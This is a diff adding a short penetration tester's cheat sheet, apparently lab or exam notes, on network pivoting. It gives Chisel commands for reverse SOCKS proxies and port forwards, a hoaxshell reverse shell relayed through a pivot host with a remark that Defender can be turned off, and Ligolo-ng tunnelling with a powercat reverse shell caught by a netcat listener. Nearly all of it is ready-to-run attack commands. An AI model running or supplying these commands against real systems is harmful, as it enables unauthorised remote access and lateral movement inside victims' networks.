@@ -1,0 +1,31 @@
+A - kali Linux | B - pivot box | C - target machine
+
+____________________________________________________________CHİSEL-Proxychains-Foxyproxy__________________________________________
+
+In kali Linux: scp /usr/bin/chisel pivotbox_username@pivotbox_ip:/tmp
+In kali Linux: chisel server --socks5 --reverse
+In pivot box : chisel client --fingerprint (we can see it in Kali) kali_ip:8080 R:socks
+	We can see port number in kali. We must change proxychains config file
+
+Shell forwarding: In pivot box      : chisel client --fingerprint (we can see it in Kali) kali_ip:8080 0.0.0.0:9999:kali_ip:9999
+		  In kali Linux     : hoaxshell -s pivotmachine_ip - 9999
+		  In target nachine : copy payload from kali, paste to powershell (defender can be close)
+Port  forwarding: In pivot box : chisel client --fingerprint (we can see it in Kali) kali_ip:8080 R:8000:target_ip:80
+
+
+
+___________________________________________________________Ligolo-ng______________________________________________________________
+
+ip tuntap add user kali mode tun ligolo
+ip link set ligolo up
+ip route add 10.1.2.0/24 dev ligolo
+
+İn pivot box : ./agent -connect kali_ip:11601 -retry -ignore-cert
+	      session - we can see active sessions
+		        hint enter for starting sesssion
+	      ifconfig- we can see all interfaces
+	      start - we get starting tunneling 
+	      listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+	                in kali Linux: nc -lvnp 10000
+			we must run powercat.ps1 in target machine | powercat -c pivotmachine_ip -p 30000 -ep 
+İn kali Linux: ./proxy -selfcert
